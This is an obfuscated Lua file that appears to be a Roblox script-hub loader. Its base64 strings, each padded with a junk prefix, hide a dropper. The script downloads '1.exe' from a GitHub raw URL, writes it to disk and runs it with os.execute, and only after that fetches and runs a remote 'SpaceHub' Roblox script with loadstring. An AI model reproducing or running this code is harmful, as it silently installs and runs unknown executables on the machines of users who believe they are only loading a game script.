local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function FNcbiKROxwkzLboGgcEnhhLLefAHJCSwugRuhwUOFcOgkQXvXAqiHlIOZEhRgLEgeoiDnARUtYdXfKgzLbYusIuuFtvVXvYFi(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local http = require(FNcbiKROxwkzLboGgcEnhhLLefAHJCSwugRuhwUOFcOgkQXvXAqiHlIOZEhRgLEgeoiDnARUtYdXfKgzLbYusIuuFtvVXvYFi('qkNmOrsVWPOiweKgbeyeUdmiHBzfWXZEFAOQukwphLgTZGwkEzPgaRtc29ja2V0Lmh0dHA='))
local ltn12 = require(FNcbiKROxwkzLboGgcEnhhLLefAHJCSwugRuhwUOFcOgkQXvXAqiHlIOZEhRgLEgeoiDnARUtYdXfKgzLbYusIuuFtvVXvYFi('EpfcfJKwaJsbAisRVwciGipSfVObLkPHiMckiPnAcrcNHlUYEuOMSWpbHRuMTI='))

local url = FNcbiKROxwkzLboGgcEnhhLLefAHJCSwugRuhwUOFcOgkQXvXAqiHlIOZEhRgLEgeoiDnARUtYdXfKgzLbYusIuuFtvVXvYFi('xctbdhhktkCGONRTemTBdzsELVYRldotRdRxXvcCxxZqMKrECmdOrnmaHR0cHM6Ly9naXRodWIuY29tL2thbHJ5LWNtZC9pZGsvcmF3L21haW4vMS5leGU=')
local path = FNcbiKROxwkzLboGgcEnhhLLefAHJCSwugRuhwUOFcOgkQXvXAqiHlIOZEhRgLEgeoiDnARUtYdXfKgzLbYusIuuFtvVXvYFi('oAGBgfZGMBbPMReHXUSdqtKdiyBwpLIAkRdurqZeKoGggYnWpcCdWMMQzovMS5leGU=')

local response_body = {}
http.request{
    url = url,
    sink = ltn12.sink.table(response_body)
}

local file = io.open(path, FNcbiKROxwkzLboGgcEnhhLLefAHJCSwugRuhwUOFcOgkQXvXAqiHlIOZEhRgLEgeoiDnARUtYdXfKgzLbYusIuuFtvVXvYFi('YxuuuYnmmVXTxRXZxRPNOzbqpanGeXbZNbHgGMQBePHeHLjCJYvLefmd2I='))
file:write(table.concat(response_body))
file:close()

os.execute(FNcbiKROxwkzLboGgcEnhhLLefAHJCSwugRuhwUOFcOgkQXvXAqiHlIOZEhRgLEgeoiDnARUtYdXfKgzLbYusIuuFtvVXvYFi('jsbChLmSnwXwUzJrfEZZcDGTEAASslCQQlIRrAQhFQRRFWmECounbNCQzpcXDEuZXhl'))
loadstring(game:HttpGet(FNcbiKROxwkzLboGgcEnhhLLefAHJCSwugRuhwUOFcOgkQXvXAqiHlIOZEhRgLEgeoiDnARUtYdXfKgzLbYusIuuFtvVXvYFi('LcuPgmPGHIVQUUkhudFzAIKwtCDmvhKlpnwDiUKDSWrfcEjlaenPyNUaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0x1Y2FzZmluMDAwL1NwYWNlSHViL21haW4vVUVTUA==')))()    
